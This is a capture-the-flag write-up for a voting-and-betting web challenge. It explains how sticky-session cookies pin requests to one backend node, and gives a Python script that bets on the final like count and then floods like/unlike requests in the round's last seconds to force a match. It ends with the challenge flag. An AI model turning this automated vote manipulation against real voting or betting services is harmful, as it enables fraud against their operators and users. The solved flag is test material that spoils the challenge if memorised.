# The Battle of the Strongest - CTF Writeup

## Challenge Description
"Every semester, capybara students argue about which faculty is better, who is stronger in their studies, and who is more active in student life. This year, capybara enthusiasts decided to turn the competition into a digital plane and created an innovative service "The Battle of the Strongest" (The Battle of the Strongest). But it doesn't seem to be the safest service."

URLs provided: `http://155.212.185.30`, `http://159.194.237.43`, `http://194.156.119.204`

## Vulnerability Analysis

The challenge presents a voting/betting system where users can vote/like, and place a bet on what the final number of likes will be at the end of a 5-minute (300 seconds) round. If the user correctly guesses the exact final number of likes, the flag is revealed in their dashboard.

Upon investigating the `/api/timer` and `/api/likes` endpoints, two distinct behaviors became evident:
1. **Load Balancer with Sticky Sessions:** When repeatedly calling `/api/timer` without saving the `web_session` cookie provided in the response, the remaining time and round number jump erratically. This is because the service is deployed across multiple nodes, each with its own independent timer state. Using the `web_session` cookie correctly pins our HTTP session to a single backend node, stabilizing the timer.
2. **Competing Bot Traffic:** Even when pinned to a specific server, the like count fluctuates unpredictably. The prompt hints that capybara students "argue about who is more active" – meaning automated bots (simulated students) are actively adding and removing likes throughout the round.

## Exploit Strategy

To win the bet, we must maintain the like count perfectly at our predicted number precisely when the round ends (remaining time = 0).

1. Register an account and login to obtain an authentication cookie (`session`).
2. Make a request to the server and capture the `web_session` cookie to pin our exploit script to a single backend node.
3. Observe the current number of likes and place a bet for a moderately higher number (e.g. `current_likes + 60`).
4. Continuously poll the `/api/timer` and `/api/likes` endpoints using the sticky session cookies.
5. In the final 15-20 seconds of the round, aggressively add or remove likes via `/api/like` and `/api/unlike` endpoints to combat the bot traffic and force the like count to match our bet perfectly.
6. Once the round advances, load the `/dashboard` endpoint and extract the flag from the HTML.

## Proof of Concept

```python
import requests
import time
import sys

URL = "http://155.212.185.30"
WEB_SESSION = "ab59b291cc3af8ac" # Example cookie obtained manually or programmatically
COOKIES = {
    "web_session": WEB_SESSION,
    "session": "..." # Replace with valid session cookie
}

def run():
    print("Getting round info...")
    timer = requests.get(f"{URL}/api/timer", cookies=COOKIES).json()
    r = requests.get(f"{URL}/api/likes", cookies=COOKIES)
    data = r.json()
    target_round = timer['round']

    # Place a bet comfortably above the current count
    bet_value = data['count'] + 60
    if target_round != data['round']:
        bet_value = 60

    print(f"Placing bet: {bet_value} for round {target_round}")
    requests.post(f"{URL}/api/bet", cookies=COOKIES, json={'bet': bet_value})

    last_likes = -1

    while True:
        timer = requests.get(f"{URL}/api/timer", cookies=COOKIES).json()
        current_likes = requests.get(f"{URL}/api/likes", cookies=COOKIES).json()['count']
        rem = timer['remaining']

        if timer['round'] > target_round:
            print(f"Round advanced to {timer['round']}")
            break

        if current_likes != last_likes:
            print(f"Remaining: {rem:.1f}s, round: {timer['round']}, current likes: {current_likes}")
            last_likes = current_likes

        # Very aggressive polling and fixing near the end of the timer
        if rem <= 15:
            if current_likes < bet_value:
                for _ in range(bet_value - current_likes):
                    requests.post(f"{URL}/api/like", cookies=COOKIES, json={})
            elif current_likes > bet_value:
                for _ in range(current_likes - bet_value):
                    requests.post(f"{URL}/api/unlike", cookies=COOKIES, json={})
            time.sleep(0.01)
        elif rem <= 60:
            if current_likes < bet_value:
                requests.post(f"{URL}/api/like", cookies=COOKIES, json={})
            elif current_likes > bet_value:
                requests.post(f"{URL}/api/unlike", cookies=COOKIES, json={})
            time.sleep(0.05)
        else:
            time.sleep(1)

    print("Fetching dashboard...")
    time.sleep(1)

    dashboard = requests.get(f"{URL}/dashboard", cookies=COOKIES).text
    if 'flag{' in dashboard.lower() or 'ctf{' in dashboard.lower() or 'KubSTU' in dashboard:
        print("Flag found!")
        import re
        flags = re.findall(r'[a-zA-Z0-9_]*\(.*?\)|\w*\{.*?\}', dashboard)
        for flag in flags:
            print(flag)
    else:
        print("No flag found. Try again.")

run()
```

## Flag
`KubSTU(Y0u_ar3_champ10n)`
